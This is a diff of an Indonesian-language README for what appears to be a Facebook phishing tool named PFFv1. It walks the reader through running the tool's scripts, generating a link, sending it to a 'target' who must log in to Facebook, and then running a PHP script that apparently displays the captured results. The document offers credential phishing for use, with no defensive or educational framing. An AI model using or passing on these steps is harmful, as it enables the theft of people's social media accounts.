@@ -25,9 +25,9 @@ ls
 
 bash PFFv1.sh
 
-Pilih mode 1/2
+Pilih mode nomor 1 aja biar cepet:v
 
-Buat link custom/tidak
+Buat link custom/tidak terserah kalian
 
 Salin link...beri ke target dan target harus login fb
 
@@ -36,6 +36,8 @@ Buka sesion baru
 cd PFFv1
 
 bash PFF.sh
+
+php hasil.php
 
 Terimakasih:)
 
